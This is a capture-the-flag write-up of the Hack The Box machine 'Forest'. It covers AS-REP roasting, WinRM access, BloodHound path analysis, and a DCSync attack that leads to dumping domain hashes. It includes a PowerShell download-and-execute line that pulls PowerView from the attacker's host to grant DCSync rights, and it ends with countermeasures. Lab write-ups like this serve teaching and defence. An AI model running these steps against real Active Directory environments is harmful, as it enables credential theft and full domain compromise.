# HTB: Forest Writeup w/o Metasploit
![forest](https://user-images.githubusercontent.com/48168337/166676766-68748299-2055-46cc-bb97-6a481b49eaa1.png)

## Introduction
Forest is definitely one of my favorite boxes because it allows us to play with another real world service, Active Directory. I love working with these, because a lot if not most organizations have some type of Directory Service. This is a great box to get your hands-on a real-world scenario. Alright, let's get right into it.


## Recon
The first thing I did here was kick off some nmap scans per usual.

![nmap](https://user-images.githubusercontent.com/48168337/166676854-6aac1c61-c438-4b86-b734-6d39084b9f45.JPG)

(*nmap -n -Pn -p- - open -oN full-scan-10.10.10.161 10.10.10.161*)


There are a bunch of ports open on this box. You can see we have DNS, Kerberos, LDAP, WinRM, and other services available. I talk more about these services during the video walkthrough. I will share at the end of the writeup. Based on the services available, we can assume this is probably some kind of Active Directory Service or Domain Controller. Lets gather more information using enum4linux.

![users](https://user-images.githubusercontent.com/48168337/166677091-23a84306-ff82-4c7f-b960-9a0f67e506c8.JPG)

## Enumeration 
Enum4linux returned a lot of information. What stood out to me the most were the user accounts; it even looks like we found a service account (svc-alfresco). We'll actually being using this later.

We don't have any passwords for these user accounts, so we can't log in with them just yet. But we can try to brute force them with an AS-REP Roasting attack. Why this attack? Because this box has Kerberos running on it. If pre-authentication isn't enabled, Kerberos can be vulnerable to an AS-REP Roasting attack. AS-REP Roasting targets Kerberos and tries to request a TGT ticket (hash) which we "try" to crack. To do the AS-REP Roasting we'll use Impacket. This, I believe, comes preinstalled on Kali Linux under /usr/share/doc/python3-impacket/examples/. The Impacket script we'll use is GetNPUsers.py.

![pre-auth](https://user-images.githubusercontent.com/48168337/166677134-5c313cb3-a54c-44b1-98e1-5cf94441d7d6.JPG)

(*python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile ldap_users.txt -dc-ip 10.10.10.161*)

## Initial Exploitation
Cool. The attack works and gives us svc-alfresco's TGT (hash). Let's throw it into John and try to crack the password. FYI: I put the hash inside of a file before using it with John. And since I've already cracked the hash, I had to run the "--show" option to show the cleartext password.

![1](https://user-images.githubusercontent.com/48168337/166677905-057f3d2c-500b-47af-96ba-ddcd849bb799.JPG)


Sweet. Now we have svc-alfresco's password. Now what? Well, when looking for next steps, I tend to look back at the services and loot we have available. There was a WinRM service running on this box, and we have credentials to use. Let's try it against the WinRM service. If you're not familiar with it, WinRM is a Windows Remote Service we can use for remote logins (kind of like ssh). We'll use the evil winrm tool to login as svc-alfresco.

![2](https://user-images.githubusercontent.com/48168337/166678044-bd59ef6f-34c6-4f36-be12-1193268da556.JPG)


## Privilege Escalation
Alright, we finally have access to the box. Let's cut right to it and escalate our privileges. We know this is some sort of Directory server since it has LDAP services enabled, and the name of the box is Forest (Active Directory) lol. Because of that, let's use Sharphound and Bloodhound to extract AD objects. If you've never used them before, don't worry, they are pretty easy to use. I'll break them down further during our walkthrough video. For now, Sharphound collects the AD objects and Bloodhound analyzes it. There are other ways to collect the objects but we're going to use [Sharphound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors).


First, we'll need to download sharphound to our local machine and then transfer it to the target box (forest). Use the github repo above to download sharphound. Then start up a webserver on your local machine so you can retrieve the file over http from the target box.
![3](https://user-images.githubusercontent.com/48168337/166678040-35f6e886-1c46-4760-807d-509d828243ed.JPG)



Afterwards start sharphound with ./sharphound.exe -c all. This will try to collect everything it can regarding AD objects. It will save all of this in a zip file. We'll need to transfer that zip file back to our local box and upload it into Bloodhound. To do this, I'm going to start a smbserver on my local machine and send the zip file to my smbserver; I'm going to rename the zip file first to something a bit easier to type out.

![4](https://user-images.githubusercontent.com/48168337/166678041-7f07d11e-c479-4687-b737-61ed8fb6ee4d.JPG)



Now we have the file on our local kali box. We just need to start up neo4j (Bloodhound's database server), then start up Bloodhound, and then upload the zip file into Bloodhound. FYI: You may have to setup neo4j. It isn't too much work; I think you just need to change the default password after starting the service.


To start neo4j, enter "neo4j console" into the terminal. To start Bloodhound, we just need to type and enter "bloodhound."
![5](https://user-images.githubusercontent.com/48168337/166678042-1412161a-18d9-4a7a-91b0-65890ed27b4e.JPG)


Once Bloodhound is started up, select the "upload data" button towards the right and upload your zip file.

![image](https://user-images.githubusercontent.com/48168337/166678538-4d000810-1205-461a-828d-32779fcfe27f.png)


In this writeup, I won't do too much explaining of Bloodhound, we'll save that for the video walkthrough. Let's use the search bar to look for the svc-alfresco.

![image](https://user-images.githubusercontent.com/48168337/166678586-66f028ff-4efe-4e4d-acb9-2dad3d2e4a9f.png)

Since we cracked the password. Right click on the user icon and select "mark user as owned."

![image](https://user-images.githubusercontent.com/48168337/166678651-2607694d-640d-46ba-a458-2f73d238916c.png)


Next let's use the Analysis tab to find the "Shortest Path to High Value Targets."

![image](https://user-images.githubusercontent.com/48168337/166678706-983d8df4-8a3f-4325-8df8-d27ba0381897.png)


This will look like a soup sandwich, so I'm only going to show what we're interested with. The "Exchange Windows Permissions" Group has WriteDacl permissions to HTB.local.

![image](https://user-images.githubusercontent.com/48168337/166678739-43e34fc9-0775-4157-b4aa-fbb34103239d.png)


This means that group can modify permissions on HTB.local. In other words, they can grant themself any privileges they want on HTB.local. But we'll need access to a user account in that group. Right click "Exchange Windows Permission" group and select "shortest path to here from owned." This will show us our (svc-alfresco's) permissions regarding that group.
![image](https://user-images.githubusercontent.com/48168337/166678792-7f8d20ad-f3d0-462a-986b-d5475fbb5112.png)


As you can see, we are members of the Account Operators group, which has GenericAll access to the "Exchange Windows Permissions" group. This means we have full control of "Exchange Windows Permissions" group, so we should be able to add a user to that group. Once our new user is in that group, we will abuse the Write Dacl to perform a Dsync attack against htb.local.

Dsync attacks remind me of DNS zone transfers where you're replicating all the DNS entries from one DNS server to another. Dsync replicates Domain Controller information to another (our box). This includes the password hashes for other accounts. Fortunately, Bloodhound shows us the steps we need to do the Dsync attack. You just have to right click "write dacl" and select the "abuse info" tab.

![image](https://user-images.githubusercontent.com/48168337/166678866-116caecc-9ae1-4f35-880e-5668f2058083.png)

Ok, let's go ahead and create the new account first.

![image](https://user-images.githubusercontent.com/48168337/166678906-d617673d-31da-4178-b2f7-14b409e5a475.png)


Then we'll add it to the right group.

![image](https://user-images.githubusercontent.com/48168337/166678947-15b1789b-8a27-4ddc-85fc-563b6c804881.png)

Now we run the Dsync attack steps from Bloodhound. The only thing we'll need for this to work is the PowerView.ps1 [script](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). This script is the first thing that gets executed. Make sure you're hosting the script via http (python webserver) so we can execute it. Once you're http service is running use the lines below, one a time, to setup the dsync attack.

1. IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PowerView.ps1')
2. $SecPassword = ConvertTo-SecureString 'olinesecurity' -AsPlainText -Force
3. $Cred = New-Object System.Management.Automation.PSCredential('HTB\kage', $SecPassword)
4. Add-ObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity kage -Rights DCSync

![image](https://user-images.githubusercontent.com/48168337/166679026-77f2b38a-e51f-4930-8c5a-4803cd6bd186.png)

Cool. Everything is now setup for us to do the dsync attack. There are several ways to perform this. The Bloodhound instructions uses mimikatz. I'm going to use another Impacket script (secretsdump.py). This will be done locally from my kali box.

![image](https://user-images.githubusercontent.com/48168337/166679059-77637135-3178-446e-a4f7-d954c9f1073d.png)

As a result, we get a bunch of hashes for various user accounts. From here we can simply do a pass the hash attack with a tool of your choice; I used psexec.

![image](https://user-images.githubusercontent.com/48168337/166679069-750c7c1f-1bd8-4bb2-874d-df3814f1859d.png)


## Conclusion
And that's its folks. Forest could have been extremely difficult if you have 0 experience with Directory Services and Kerberos. Nonetheless, it was a great challenge and learning experience.

## AAR
A few countermeasures before we go.
(1) Anonymous users shouldn't be able to remotely list account names and resources. We did this with enum4linux. This is how we found the service account (svc_alfresco). 
(2) Pre-authentication should be enabled to prevent the AS-REP roasting attack. With this enabled we wouldn't be able to get svc_alfresco's TGT hash. 
(3) Better group access controls may have prevented us from creating our own access controls to perform the Dsync attack. 
(4) Furthermore, we want to try and prevent the Dsync attack. This can be difficult to do since its abusing normal Active Directory functionality. However, we can prevent the attack by limiting the users and groups that can replicate directory changes. All in all, what made this box exciting was it being a use-case scenario. Hopefully, you enjoyed this writeup, [here](https://youtu.be/DLPgQ9ooxCQ) is the video walkthrough.